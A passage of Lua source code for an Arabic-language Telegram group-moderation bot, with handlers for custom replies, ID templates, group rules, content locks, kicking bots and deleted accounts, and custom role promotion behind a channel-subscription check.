send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'TEXT_BOT')
send(msg.chat_id_, msg.id_,' ⋄تم مسح رد بوت')
end
if text == 'ضع رد بوت' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:set(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,' ⋄ارسل رد الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⋄تم الغاء حفظ رد بوت')
return false
end
database:set(bot_id..'TEXT_BOT',text)
database:del(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⋄تم حفظ رد بوت')
return false
end
-----------------
if text == 'تعين الايدي' then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:setex(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
 ⋄ارسل الان النص
 ⋄يمكنك اضافه :
 ⋄`#rdphoto` ~⪼ تعليق الصوره
 ⋄`#username` ~⪼ اسم 
 ⋄`#msgs` ~⪼ عدد رسائل 
 ⋄`#photos` ~⪼ عدد صور 
 ⋄`#id` ~⪼ ايدي 
 ⋄`#auto` ~⪼ تفاعل 
 ⋄`#stast` ~⪼ موقع  
 ⋄`#edit` ~⪼ السحكات
 ⋄`#game` ~⪼ النقاط
 
 ⋄معرف قناه تعين الايدي @IDPOWERB0T
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'مسح الايدي' or text == 'مسح الايدي' then
if Manager2(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:del(bot_id.."KLISH:ID"..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم ازالة كليشة الايدي')
end
return false  
end 

if database:get(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ⋄تم الغاء تعين الايدي") 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
database:set(bot_id.."KLISH:ID"..msg.chat_id_,CHENGER_ID)
send(msg.chat_id_, msg.id_,' ⋄تم تعين الايدي')    
end

if text == 'طرد البوتات' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " ⋄لا توجد بوتات في الجروب")
else
local t = ' ⋄عدد البوتات هنا >> {'..c..'}\n⋄عدد البوتات التي هي ادمن >> {'..x..'}\n⋄تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
end
if text == ("كشف البوتات") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n⋄قائمة البوتات الموجوده \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = ' {★}'
end
text = text..">> [@"..ta.username_..']'..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, " ⋄لا توجد بوتات في الجروب")
return false 
end
if #admins == i then 
local a = '\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n⋄عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = ' ⋄عدد البوتات التي هي ادمن >> {'..t..'}\n⋄ملاحضه علامة ال (✯) تعني ان البوت ادمن \n'
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end
--[[
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  
send(msg.chat_id_, msg.id_, '⋄يمكنك من خلال هذا البوت\n⋄ارسال همسه سريه للاعضاء \n⋄الامر كالاتي مثال \nاهمس بحبك ❤ [@UUOUOU_7]')
end
if text and text:match("^اهمس (.*) @(.*)") then 
local username = text:match("^اهمس (.*) @(.*)")
function hamss(res1,res2)
if not res2.id_ then 
send(msg.chat_id_, msg.id_, '⋄المعرف غير صحيح ')
return "dx"
end
function hamssss(ress1,ress2)
if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
send(msg.chat_id_, msg.id_, '⋄العضو غير موجود بالمجموعه ')
return "dx"
end
tdcli_function ({
ID="DeleteMessages",
chat_id_= msg.chat_id_,
message_ids_= {[0] = msg.id_}
}, 
dl_cb, nil)
database:set(bot_id.."HM:"..msg.chat_id_..msg.id_..res2.id_,username[1])
function bot_id_get(ros1,ros2)
function Dxx(ross1,ross2)
local hms = msg.sender_user_id_
if ross2.username_ then 
hms = "@"..ross2.username_
end
send(msg.chat_id_, msg.id_, "⋄هذه همسه سريه الى { @["..username[2].."] }\n⋄مرسله من { ["..hms.."] }\n⋄هو فقط من يستطيع رويتها\n⋄[اضغط هنا لعرض الهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..") ")
end
getUser(msg.sender_user_id_, Dxx)
end
getUser(bot_id, bot_id_get)
end
tdcli_function ({
ID = "GetChatMember",
chat_id_ = msg.chat_id_,
user_id_ = res2.id_
}, hamssss, nil)
end
resolve_username(username[2],hamss) 
end end
if text and text:match("/start hms(.*)_(%d+)") then 
username = {string.match(text, "^/start hms(.*)_(%d+)")}
if tonumber(msg.sender_user_id_) == tonumber(username[2]) then 
hmsa = database:get(bot_id.."HM:"..username[1]..username[2])
if hmsa then 
send(msg.chat_id_, msg.id_, '⋄الهمسه هي\n⋄{ ['..hmsa..'] }')
else 
send(msg.chat_id_, msg.id_, '⋄اسلك يسطا الهمسه مش ليك 😂')
end else 
send(msg.chat_id_, msg.id_, '⋄اسلك يسطا الهمسه مش ليك 😂')
end end
]]--
if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, " ⋄تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_," ⋄تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == 'ضع قوانين' or text == 'وضع قوانين' then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_," ⋄ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'مسح القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_," ⋄تم ازالة قوانين الجروب")  
database:del(bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == 'القوانين' then 
local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_," ⋄لا توجد قوانين")   
end    
end
if text == 'قفل التفليش' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التفليش ')  
end,nil)   
end
if text == 'فتح التفليش' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فـتح التفليش ')  
end,nil)   
end
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Mod(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Group_Kick(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,' ⋄تم طرد المحذوفين')
end,nil)
end
end
if text == 'الصلاحيات' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
local list = database:smembers(bot_id..'Coomds'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,' ⋄لا توجد صلاحيات مضافه')
return false
end
t = "\n⋄قائمة الصلاحيات المضافه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..''..k..'- '..v..' »> ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text and text:match("^اضف صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, " ⋄ارسل نوع الرتبه \n⋄{عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
if text and text:match("^مسح صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "* ⋄تم مسح الصلاحيه *\n") 
end
if database:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"* ⋄تم الغاء الامر *\n") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* ⋄تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n⋄ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager2(msg) then 
send(msg.chat_id_, msg.id_,"* ⋄تستطيع اضافه صلاحيات {مميز - عضو} \n⋄ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* ⋄تستطيع اضافه صلاحيات {عضو} \n⋄ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضو' then
local textn = database:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, " ⋄تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match('رفع (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('رفع (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'ادمن' and Manager2(msg) then 
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('تنزيل (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('تنزيل (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄م تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'ادمن' and Manager2(msg) then 
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'..'\n⋄تم تنزيله من '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('^رفع (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'ادمن' and Manager2(msg) then 
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم رفعه '..text1[2]..'')   
end
else
info = ' ⋄المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match('^تنزيل (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'ادمن' and Manager2(msg) then 
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⋄العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'SOPOWERB0T')..')'..'\n⋄تم تنريله من '..text1[2]..'')   
end
else
info = ' ⋄المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
